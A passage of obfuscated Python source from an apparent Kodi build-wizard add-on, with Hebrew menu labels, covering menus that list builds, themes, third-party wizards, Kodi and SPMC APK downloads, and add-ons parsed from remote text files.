		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2210
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2211
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addFile ('%s'%OO0OOO000O000OOO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2213
	else :#line:2214
		O0O00OOOO000OOO0O ,OO0O0OO0O0O0O0000 ,OO00O00OO0000OOOO ,OOOO0O0OOO0OO00O0 ,OOO00OO0000O0O000 ,O0OOO00O0O0O000OO ,O0O0O00O0OOO0OOO0 =wiz .buildCount ()#line:2215
		OO00OOO0000O00O00 =False ;OO00O0OO0OOO000OO =[]#line:2216
		if THIRDPARTY =='true':#line:2217
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00OOO0000O00O00 =True ;OO00O0OO0OOO000OO .append ('1')#line:2218
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00OOO0000O00O00 =True ;OO00O0OO0OOO000OO .append ('2')#line:2219
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00OOO0000O00O00 =True ;OO00O0OO0OOO000OO .append ('3')#line:2220
		O0OO0OOOOOOOO0O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2221
		OO0OO00OO0O0OO0O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0OOOOOOOO0O0O )#line:2222
		if O0O00OOOO000OOO0O ==1 and OO00OOO0000O00O00 ==False :#line:2223
			for OO000O00O00000O00 ,OOO0O00O0O000OOO0 ,O0OO0O0O0OOOO0O0O ,OO0O000OO0O0O00O0 ,O0OOO000OO0OO0000 ,OO00O000000O0O00O ,OOOO0OO0O0OOO00OO ,O00OO0O0OO0OO00O0 ,O0OOO0O0O000OO0O0 ,O0OOO000O000OO00O in OO0OO00OO0O0OO0O0 :#line:2224
				if not SHOWADULT =='true'and O0OOO0O0O000OO0O0 .lower ()=='yes':continue #line:2225
				if not DEVELOPER =='true'and wiz .strTest (OO000O00O00000O00 ):continue #line:2226
				viewBuild (OO0OO00OO0O0OO0O0 [0 ][0 ])#line:2227
				return #line:2228
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2231
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2232
		if OO00OOO0000O00O00 ==True :#line:2233
			for OO000OOO00OO0OO00 in OO00O0OO0OOO000OO :#line:2234
				OO000O00O00000O00 =eval ('THIRD%sNAME'%OO000OOO00OO0OO00 )#line:2235
		if len (OO0OO00OO0O0OO0O0 )>=1 :#line:2237
			if SEPERATE =='true':#line:2238
				for OO000O00O00000O00 ,OOO0O00O0O000OOO0 ,O0OO0O0O0OOOO0O0O ,OO0O000OO0O0O00O0 ,O0OOO000OO0OO0000 ,OO00O000000O0O00O ,OOOO0OO0O0OOO00OO ,O00OO0O0OO0OO00O0 ,O0OOO0O0O000OO0O0 ,O0OOO000O000OO00O in OO0OO00OO0O0OO0O0 :#line:2239
					if not SHOWADULT =='true'and O0OOO0O0O000OO0O0 .lower ()=='yes':continue #line:2240
					if not DEVELOPER =='true'and wiz .strTest (OO000O00O00000O00 ):continue #line:2241
					OOOO00O0000OO0O00 =createMenu ('install','',OO000O00O00000O00 )#line:2242
					addDir ('[%s] %s (v%s)'%(float (O0OOO000OO0OO0000 ),OO000O00O00000O00 ,OOO0O00O0O000OOO0 ),'viewbuild',OO000O00O00000O00 ,description =O0OOO000O000OO00O ,fanart =O00OO0O0OO0OO00O0 ,icon =OOOO0OO0O0OOO00OO ,menu =OOOO00O0000OO0O00 ,themeit =THEME2 )#line:2243
			else :#line:2244
				if OOOO0O0OOO0OO00O0 >0 :#line:2245
					O0O0000OO0OO0O0OO ='+'if SHOW17 =='false'else '-'#line:2246
					if SHOW17 =='true':#line:2248
						for OO000O00O00000O00 ,OOO0O00O0O000OOO0 ,O0OO0O0O0OOOO0O0O ,OO0O000OO0O0O00O0 ,O0OOO000OO0OO0000 ,OO00O000000O0O00O ,OOOO0OO0O0OOO00OO ,O00OO0O0OO0OO00O0 ,O0OOO0O0O000OO0O0 ,O0OOO000O000OO00O in OO0OO00OO0O0OO0O0 :#line:2250
							if not SHOWADULT =='true'and O0OOO0O0O000OO0O0 .lower ()=='yes':continue #line:2251
							if not DEVELOPER =='true'and wiz .strTest (OO000O00O00000O00 ):continue #line:2252
							O00O0OOO0O000000O =int (float (O0OOO000OO0OO0000 ))#line:2253
							if O00O0OOO0O000000O ==17 :#line:2254
								OOOO00O0000OO0O00 =createMenu ('install','',OO000O00O00000O00 )#line:2255
								addDir ('[%s] %s (v%s)'%(float (O0OOO000OO0OO0000 ),OO000O00O00000O00 ,OOO0O00O0O000OOO0 ),'viewbuild',OO000O00O00000O00 ,description =O0OOO000O000OO00O ,fanart =O00OO0O0OO0OO00O0 ,icon =OOOO0OO0O0OOO00OO ,menu =OOOO00O0000OO0O00 ,themeit =THEME2 )#line:2256
				if OOO00OO0000O0O000 >0 :#line:2257
					O0O0000OO0OO0O0OO ='+'if SHOW18 =='false'else '-'#line:2258
					if SHOW18 =='true':#line:2260
						for OO000O00O00000O00 ,OOO0O00O0O000OOO0 ,O0OO0O0O0OOOO0O0O ,OO0O000OO0O0O00O0 ,O0OOO000OO0OO0000 ,OO00O000000O0O00O ,OOOO0OO0O0OOO00OO ,O00OO0O0OO0OO00O0 ,O0OOO0O0O000OO0O0 ,O0OOO000O000OO00O in OO0OO00OO0O0OO0O0 :#line:2262
							if not SHOWADULT =='true'and O0OOO0O0O000OO0O0 .lower ()=='yes':continue #line:2263
							if not DEVELOPER =='true'and wiz .strTest (OO000O00O00000O00 ):continue #line:2264
							O00O0OOO0O000000O =int (float (O0OOO000OO0OO0000 ))#line:2265
							if O00O0OOO0O000000O ==18 :#line:2266
								OOOO00O0000OO0O00 =createMenu ('install','',OO000O00O00000O00 )#line:2267
								addDir ('[%s] %s (v%s)'%(float (O0OOO000OO0OO0000 ),OO000O00O00000O00 ,OOO0O00O0O000OOO0 ),'viewbuild',OO000O00O00000O00 ,description =O0OOO000O000OO00O ,fanart =O00OO0O0OO0OO00O0 ,icon =OOOO0OO0O0OOO00OO ,menu =OOOO00O0000OO0O00 ,themeit =THEME2 )#line:2268
				if OO00O00OO0000OOOO >0 :#line:2269
					O0O0000OO0OO0O0OO ='+'if SHOW16 =='false'else '-'#line:2270
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O0000OO0OO0O0OO ,OO00O00OO0000OOOO ),'togglesetting','show16',themeit =THEME3 )#line:2271
					if SHOW16 =='true':#line:2272
						for OO000O00O00000O00 ,OOO0O00O0O000OOO0 ,O0OO0O0O0OOOO0O0O ,OO0O000OO0O0O00O0 ,O0OOO000OO0OO0000 ,OO00O000000O0O00O ,OOOO0OO0O0OOO00OO ,O00OO0O0OO0OO00O0 ,O0OOO0O0O000OO0O0 ,O0OOO000O000OO00O in OO0OO00OO0O0OO0O0 :#line:2273
							if not SHOWADULT =='true'and O0OOO0O0O000OO0O0 .lower ()=='yes':continue #line:2274
							if not DEVELOPER =='true'and wiz .strTest (OO000O00O00000O00 ):continue #line:2275
							O00O0OOO0O000000O =int (float (O0OOO000OO0OO0000 ))#line:2276
							if O00O0OOO0O000000O ==16 :#line:2277
								OOOO00O0000OO0O00 =createMenu ('install','',OO000O00O00000O00 )#line:2278
								addDir ('[%s] %s (v%s)'%(float (O0OOO000OO0OO0000 ),OO000O00O00000O00 ,OOO0O00O0O000OOO0 ),'viewbuild',OO000O00O00000O00 ,description =O0OOO000O000OO00O ,fanart =O00OO0O0OO0OO00O0 ,icon =OOOO0OO0O0OOO00OO ,menu =OOOO00O0000OO0O00 ,themeit =THEME2 )#line:2279
				if OO0O0OO0O0O0O0000 >0 :#line:2280
					O0O0000OO0OO0O0OO ='+'if SHOW15 =='false'else '-'#line:2281
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O0000OO0OO0O0OO ,OO0O0OO0O0O0O0000 ),'togglesetting','show15',themeit =THEME3 )#line:2282
					if SHOW15 =='true':#line:2283
						for OO000O00O00000O00 ,OOO0O00O0O000OOO0 ,O0OO0O0O0OOOO0O0O ,OO0O000OO0O0O00O0 ,O0OOO000OO0OO0000 ,OO00O000000O0O00O ,OOOO0OO0O0OOO00OO ,O00OO0O0OO0OO00O0 ,O0OOO0O0O000OO0O0 ,O0OOO000O000OO00O in OO0OO00OO0O0OO0O0 :#line:2284
							if not SHOWADULT =='true'and O0OOO0O0O000OO0O0 .lower ()=='yes':continue #line:2285
							if not DEVELOPER =='true'and wiz .strTest (OO000O00O00000O00 ):continue #line:2286
							O00O0OOO0O000000O =int (float (O0OOO000OO0OO0000 ))#line:2287
							if O00O0OOO0O000000O <=15 :#line:2288
								OOOO00O0000OO0O00 =createMenu ('install','',OO000O00O00000O00 )#line:2289
								addDir ('[%s] %s (v%s)'%(float (O0OOO000OO0OO0000 ),OO000O00O00000O00 ,OOO0O00O0O000OOO0 ),'viewbuild',OO000O00O00000O00 ,description =O0OOO000O000OO00O ,fanart =O00OO0O0OO0OO00O0 ,icon =OOOO0OO0O0OOO00OO ,menu =OOOO00O0000OO0O00 ,themeit =THEME2 )#line:2290
		elif O0O0O00O0OOO0OOO0 >0 :#line:2291
			if O0OOO00O0O0O000OO >0 :#line:2292
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2293
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2294
			else :#line:2295
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
	setView ('files','viewType')#line:2298
def viewBuild (O00OOOO00000OO000 ):#line:2300
	O0OO0O0OO0O00OO00 =wiz .workingURL (SPEEDFILE )#line:2301
	if not O0OO0O0OO0O00OO00 ==True :#line:2302
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2303
		addFile ('%s'%O0OO0O0OO0O00OO00 ,'',themeit =THEME3 )#line:2304
		return #line:2305
	if wiz .checkBuild (O00OOOO00000OO000 ,'version')==False :#line:2306
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2307
		addFile ('%s was not found in the builds list.'%O00OOOO00000OO000 ,'',themeit =THEME3 )#line:2308
		return #line:2309
	O00O0000O0OOO00O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2310
	O00O0OOO0O00O0O00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00OOOO00000OO000 ).findall (O00O0000O0OOO00O0 )#line:2311
	for O000OOOO00O0O0OO0 ,O0OO0000000O0O0OO ,O0OOOOO0000O00OOO ,OOOOOO0O0OOO0O000 ,O00OOO00O0O0OO000 ,O00O0OO00O000OOOO ,O000OO00O0O00O000 ,O00OO000OOO0OO00O ,O0O0O0OO000OO00OO ,O00O0OO0O0OOO0O0O in O00O0OOO0O00O0O00 :#line:2312
		O00O0OO00O000OOOO =O00O0OO00O000OOOO if wiz .workingURL (O00O0OO00O000OOOO )else ICON #line:2313
		O000OO00O0O00O000 =O000OO00O0O00O000 if wiz .workingURL (O000OO00O0O00O000 )else FANART #line:2314
		OO0OO0OOO00O0O00O ='%s (v%s)'%(O00OOOO00000OO000 ,O000OOOO00O0O0OO0 )#line:2315
		if BUILDNAME ==O00OOOO00000OO000 and O000OOOO00O0O0OO0 >BUILDVERSION :#line:2316
			OO0OO0OOO00O0O00O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0OO0OOO00O0O00O ,BUILDVERSION )#line:2317
		OOO00OOO00OOO000O =int (float (KODIV ));O000O00OOOO0O0O0O =int (float (OOOOOO0O0OOO0O000 ))#line:2326
		if not OOO00OOO00OOO000O ==O000O00OOOO0O0O0O :#line:2327
			if OOO00OOO00OOO000O ==16 and O000O00OOOO0O0O0O <=15 :OOO0OO00O000OO0OO =False #line:2328
			else :OOO0OO00O000OO0OO =True #line:2329
		else :OOO0OO00O000OO0OO =False #line:2330
		addFile ('התקנה','install',O00OOOO00000OO000 ,'fresh',description =O00O0OO0O0OOO0O0O ,fanart =O000OO00O0O00O000 ,icon =O00O0OO00O000OOOO ,themeit =THEME1 )#line:2334
		if not O00OOO00O0O0OO000 =='http://':#line:2337
			if wiz .workingURL (O00OOO00O0O0OO000 )==True :#line:2338
				addFile (wiz .sep ('THEMES'),'',fanart =O000OO00O0O00O000 ,icon =O00O0OO00O000OOOO ,themeit =THEME3 )#line:2339
				O00O0000O0OOO00O0 =wiz .openURL (O00OOO00O0O0OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2340
				O00O0OOO0O00O0O00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0000O0OOO00O0 )#line:2341
				for OOO00OO0OOOOOOO0O ,OO0O00OOOOOOOO0OO ,O0OO0O000000O000O ,O0OOO0O00O000OO00 ,OO0000OOO0OO0O0OO ,O00O0OO0O0OOO0O0O in O00O0OOO0O00O0O00 :#line:2342
					if not SHOWADULT =='true'and OO0000OOO0OO0O0OO .lower ()=='yes':continue #line:2343
					O0OO0O000000O000O =O0OO0O000000O000O if O0OO0O000000O000O =='http://'else O00O0OO00O000OOOO #line:2344
					O0OOO0O00O000OO00 =O0OOO0O00O000OO00 if O0OOO0O00O000OO00 =='http://'else O000OO00O0O00O000 #line:2345
					addFile (OOO00OO0OOOOOOO0O if not OOO00OO0OOOOOOO0O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO00OO0OOOOOOO0O ,'theme',O00OOOO00000OO000 ,OOO00OO0OOOOOOO0O ,description =O00O0OO0O0OOO0O0O ,fanart =O0OOO0O00O000OO00 ,icon =O0OO0O000000O000O ,themeit =THEME3 )#line:2346
	setView ('files','viewType')#line:2347
def viewThirdList (OOO0000000O0O0000 ):#line:2349
	OO0OOOO0OOO0O0OOO =eval ('THIRD%sNAME'%OOO0000000O0O0000 )#line:2350
	OO0O00000OO0000O0 =eval ('THIRD%sURL'%OOO0000000O0O0000 )#line:2351
	OO0O000OOO0O00OO0 =wiz .workingURL (OO0O00000OO0000O0 )#line:2352
	if not OO0O000OOO0O00OO0 ==True :#line:2353
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2354
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2355
	else :#line:2356
		OO000OOO0O000OOO0 ,OOO0OO00OOOO0O00O =wiz .thirdParty (OO0O00000OO0000O0 )#line:2357
		addFile ("[B]%s[/B]"%OO0OOOO0OOO0O0OOO ,'',themeit =THEME3 )#line:2358
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2359
		if OO000OOO0O000OOO0 :#line:2360
			for OO0OOOO0OOO0O0OOO ,OO00OOO0OO0O00O00 ,OO0O00000OO0000O0 ,O0O0OOOOO0O000O00 ,O0O00OO0OOOOO0O00 ,OO00O00OOOO0O0OOO ,O0000O00OO0000OO0 ,O00O0000OOOOOOO0O in OOO0OO00OOOO0O00O :#line:2361
				if not SHOWADULT =='true'and O0000O00OO0000OO0 .lower ()=='yes':continue #line:2362
				addFile ("[%s] %s v%s"%(O0O0OOOOO0O000O00 ,OO0OOOO0OOO0O0OOO ,OO00OOO0OO0O00O00 ),'installthird',OO0OOOO0OOO0O0OOO ,OO0O00000OO0000O0 ,icon =O0O00OO0OOOOO0O00 ,fanart =OO00O00OOOO0O0OOO ,description =O00O0000OOOOOOO0O ,themeit =THEME2 )#line:2363
		else :#line:2364
			for OO0OOOO0OOO0O0OOO ,OO0O00000OO0000O0 ,O0O00OO0OOOOO0O00 ,OO00O00OOOO0O0OOO ,O00O0000OOOOOOO0O in OOO0OO00OOOO0O00O :#line:2365
				addFile (OO0OOOO0OOO0O0OOO ,'installthird',OO0OOOO0OOO0O0OOO ,OO0O00000OO0000O0 ,icon =O0O00OO0OOOOO0O00 ,fanart =OO00O00OOOO0O0OOO ,description =O00O0000OOOOOOO0O ,themeit =THEME2 )#line:2366
def editThirdParty (O00O0OOO0OO0O000O ):#line:2368
	O0O0OOO00O0OOOO0O =eval ('THIRD%sNAME'%O00O0OOO0OO0O000O )#line:2369
	OOO000O0OO000OOOO =eval ('THIRD%sURL'%O00O0OOO0OO0O000O )#line:2370
	OO00O0OOO00OO0O0O =wiz .getKeyboard (O0O0OOO00O0OOOO0O ,'Enter the Name of the Wizard')#line:2371
	O00O0OO000OO00OOO =wiz .getKeyboard (OOO000O0OO000OOOO ,'Enter the URL of the Wizard Text')#line:2372
	wiz .setS ('wizard%sname'%O00O0OOO0OO0O000O ,OO00O0OOO00OO0O0O )#line:2374
	wiz .setS ('wizard%surl'%O00O0OOO0OO0O000O ,O00O0OO000OO00OOO )#line:2375
def apkScraper (name =""):#line:2377
	if name =='kodi':#line:2378
		O0OO000OOOOO0O0O0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2379
		OOOO0O0OOOO00O000 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2380
		OOO0OOO0O0000OOO0 =wiz .openURL (O0OO000OOOOO0O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2381
		OO0O00OOO000OO00O =wiz .openURL (OOOO0O0OOOO00O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2382
		OOO00O00OOO0O0000 =0 #line:2383
		O0O00OO0000O00OO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0OOO0O0000OOO0 )#line:2384
		O00OO0000O0O0OO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00OOO000OO00O )#line:2385
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2387
		O0000O0OO0O0OOOOO =False #line:2388
		for OO0O0000000O000OO ,name ,O0OOOO00OOO0OOO0O ,O00OOOO0OOO0O0000 in O0O00OO0000O00OO0 :#line:2389
			if OO0O0000000O000OO in ['../','old/']:continue #line:2390
			if not OO0O0000000O000OO .endswith ('.apk'):continue #line:2391
			if not OO0O0000000O000OO .find ('_')==-1 and O0000O0OO0O0OOOOO ==True :continue #line:2392
			try :#line:2393
				O0000OO0O00O0OO00 =name .split ('-')#line:2394
				if not OO0O0000000O000OO .find ('_')==-1 :#line:2395
					O0000O0OO0O0OOOOO =True #line:2396
					O00000OO00OO0O000 ,OO000000000000O00 =O0000OO0O00O0OO00 [2 ].split ('_')#line:2397
				else :#line:2398
					O00000OO00OO0O000 =O0000OO0O00O0OO00 [2 ]#line:2399
					OO000000000000O00 =''#line:2400
				OO0O000000OO0OO00 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO0O00O0OO00 [0 ].title (),O0000OO0O00O0OO00 [1 ],OO000000000000O00 .upper (),O00000OO00OO0O000 ,COLOR2 ,O0OOOO00OOO0OOO0O .replace (' ',''),COLOR1 ,O00OOOO0OOO0O0000 )#line:2401
				OO0O00O0OO000OO0O =urljoin (O0OO000OOOOO0O0O0 ,OO0O0000000O000OO )#line:2402
				addFile (OO0O000000OO0OO00 ,'apkinstall',"%s v%s%s %s"%(O0000OO0O00O0OO00 [0 ].title (),O0000OO0O00O0OO00 [1 ],OO000000000000O00 .upper (),O00000OO00OO0O000 ),OO0O00O0OO000OO0O )#line:2403
				OOO00O00OOO0O0000 +=1 #line:2404
			except :#line:2405
				wiz .log ("Error on: %s"%name )#line:2406
		for OO0O0000000O000OO ,name ,O0OOOO00OOO0OOO0O ,O00OOOO0OOO0O0000 in O00OO0000O0O0OO00 :#line:2408
			if OO0O0000000O000OO in ['../','old/']:continue #line:2409
			if not OO0O0000000O000OO .endswith ('.apk'):continue #line:2410
			if not OO0O0000000O000OO .find ('_')==-1 :continue #line:2411
			try :#line:2412
				O0000OO0O00O0OO00 =name .split ('-')#line:2413
				OO0O000000OO0OO00 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO0O00O0OO00 [0 ].title (),O0000OO0O00O0OO00 [1 ],O0000OO0O00O0OO00 [2 ],COLOR2 ,O0OOOO00OOO0OOO0O .replace (' ',''),COLOR1 ,O00OOOO0OOO0O0000 )#line:2414
				OO0O00O0OO000OO0O =urljoin (OOOO0O0OOOO00O000 ,OO0O0000000O000OO )#line:2415
				addFile (OO0O000000OO0OO00 ,'apkinstall',"%s v%s %s"%(O0000OO0O00O0OO00 [0 ].title (),O0000OO0O00O0OO00 [1 ],O0000OO0O00O0OO00 [2 ]),OO0O00O0OO000OO0O )#line:2416
				OOO00O00OOO0O0000 +=1 #line:2417
			except :#line:2418
				wiz .log ("Error on: %s"%name )#line:2419
		if OOO00O00OOO0O0000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2420
	elif name =='spmc':#line:2421
		OOOOOOO0OO0O0O0O0 ='https://github.com/koying/SPMC/releases'#line:2422
		OOO0OOO0O0000OOO0 =wiz .openURL (OOOOOOO0OO0O0O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2423
		OOO00O00OOO0O0000 =0 #line:2424
		O0O00OO0000O00OO0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOO0OOO0O0000OOO0 )#line:2425
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2427
		for name ,OO0OO0O0OO0O0000O in O0O00OO0000O00OO0 :#line:2429
			OOOOO00O0OO00OO0O =''#line:2430
			O00OO0000O0O0OO00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0OO0O0OO0O0000O )#line:2431
			for O0O000O0OOOOOO000 ,OO00OOO0O0OOOOOO0 ,OO0O0OOO00OO0OO0O in O00OO0000O0O0OO00 :#line:2432
				if OO0O0OOO00OO0OO0O .find ('armeabi')==-1 :continue #line:2433
				if OO0O0OOO00OO0OO0O .find ('launcher')>-1 :continue #line:2434
				OOOOO00O0OO00OO0O =urljoin ('https://github.com',O0O000O0OOOOOO000 )#line:2435
				break #line:2436
		if OOO00O00OOO0O0000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2438
def apkMenu (url =None ):#line:2440
	if url ==None :#line:2441
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2444
	if not APKFILE =='http://':#line:2445
		if url ==None :#line:2446
			O0000OO00OO0O00O0 =wiz .workingURL (APKFILE )#line:2447
			OO0O00O00OO0O0O0O =uservar .APKFILE #line:2448
		else :#line:2449
			O0000OO00OO0O00O0 =wiz .workingURL (url )#line:2450
			OO0O00O00OO0O0O0O =url #line:2451
		if O0000OO00OO0O00O0 ==True :#line:2452
			O000OOOOOOO0OO00O =wiz .openURL (OO0O00O00OO0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2453
			OOO000000O0000OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OOOOOOO0OO00O )#line:2454
			if len (OOO000000O0000OO0 )>0 :#line:2455
				OO00O0O0OO00O000O =0 #line:2456
				for OO0OOO0000OOO00OO ,OOOOO0OO0O0O000OO ,url ,O000OOO00O0OO0000 ,O00OO000OO0O000O0 ,OO0OO0OOO000000O0 ,O0O0OOOO0000O00O0 in OOO000000O0000OO0 :#line:2457
					if not SHOWADULT =='true'and OO0OO0OOO000000O0 .lower ()=='yes':continue #line:2458
					if OOOOO0OO0O0O000OO .lower ()=='yes':#line:2459
						OO00O0O0OO00O000O +=1 #line:2460
						addDir ("[B]%s[/B]"%OO0OOO0000OOO00OO ,'apk',url ,description =O0O0OOOO0000O00O0 ,icon =O000OOO00O0OO0000 ,fanart =O00OO000OO0O000O0 ,themeit =THEME3 )#line:2461
					else :#line:2462
						OO00O0O0OO00O000O +=1 #line:2463
						addFile (OO0OOO0000OOO00OO ,'apkinstall',OO0OOO0000OOO00OO ,url ,description =O0O0OOOO0000O00O0 ,icon =O000OOO00O0OO0000 ,fanart =O00OO000OO0O000O0 ,themeit =THEME2 )#line:2464
					if OO00O0O0OO00O000O <1 :#line:2465
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2466
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2467
		else :#line:2468
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2469
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2470
			addFile ('%s'%O0000OO00OO0O00O0 ,'',themeit =THEME3 )#line:2471
		return #line:2472
	else :wiz .log ("[APK Menu] No APK list added.")#line:2473
	setView ('files','viewType')#line:2474
def addonMenu (url =None ):#line:2476
	if not ADDONFILE =='http://':#line:2477
		if url ==None :#line:2478
			OOO0000OOOO0O00O0 =wiz .workingURL (ADDONFILE )#line:2479
			OOOOOO0O0000O0000 =uservar .ADDONFILE #line:2480
		else :#line:2481
			OOO0000OOOO0O00O0 =wiz .workingURL (url )#line:2482
			OOOOOO0O0000O0000 =url #line:2483
		if OOO0000OOOO0O00O0 ==True :#line:2484
			O0000OO0O0000OO00 =wiz .openURL (OOOOOO0O0000O0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2485
			O0OOO0O0000OO0O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OO0O0000OO00 )#line:2486
			if len (O0OOO0O0000OO0O0O )>0 :#line:2487
				O00O000O0OOO0OO00 =0 #line:2488
				for O0O0O0O0000OO0O00 ,O0OO00OOOO0OOOOOO ,url ,OO0O0OO00OO0O000O ,O0O0O0OOOO0O0O000 ,O0O00O0OOOO0000OO ,OO0O0O0O0OOOOOOO0 ,O00OOOO0O0O0O00O0 ,OO00O0O0O00OOOOO0 ,O0O0OO0O0OOOO000O in O0OOO0O0000OO0O0O :#line:2489
					if O0OO00OOOO0OOOOOO .lower ()=='section':#line:2490
						O00O000O0OOO0OO00 +=1 #line:2491
						addDir ("[B]%s[/B]"%O0O0O0O0000OO0O00 ,'addons',url ,description =O0O0OO0O0OOOO000O ,icon =OO0O0O0O0OOOOOOO0 ,fanart =O00OOOO0O0O0O00O0 ,themeit =THEME3 )#line:2492
					else :#line:2493
						if not SHOWADULT =='true'and OO00O0O0O00OOOOO0 .lower ()=='yes':continue #line:2494
						try :#line:2495
							O0O0OOOOOO000OOO0 =xbmcaddon .Addon (id =O0OO00OOOO0OOOOOO ).getAddonInfo ('path')#line:2496
							if os .path .exists (O0O0OOOOOO000OOO0 ):#line:2497
								O0O0O0O0000OO0O00 ="[COLOR green][Installed][/COLOR] %s"%O0O0O0O0000OO0O00 #line:2498
						except :#line:2499
							pass #line:2500
						O00O000O0OOO0OO00 +=1 #line:2501
						addFile (O0O0O0O0000OO0O00 ,'addoninstall',O0OO00OOOO0OOOOOO ,OOOOOO0O0000O0000 ,description =O0O0OO0O0OOOO000O ,icon =OO0O0O0O0OOOOOOO0 ,fanart =O00OOOO0O0O0O00O0 ,themeit =THEME2 )#line:2502
					if O00O000O0OOO0OO00 <1 :#line:2503
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2504
			else :#line:2505
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2506
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2507
		else :#line:2508
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2509
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2510
			addFile ('%s'%OOO0000OOOO0O00O0 ,'',themeit =THEME3 )#line:2511
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2512
	setView ('files','viewType')#line:2513
def addonInstaller (OOOOOO0OO000OOOO0 ,O0O0O0000000OO000 ):#line:2515
	if not ADDONFILE =='http://':#line:2516
		O00O000000000O000 =wiz .workingURL (O0O0O0000000OO000 )#line:2517
		if O00O000000000O000 ==True :#line:2518
			OOOOO0OOO00O000O0 =wiz .openURL (O0O0O0000000OO000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2519
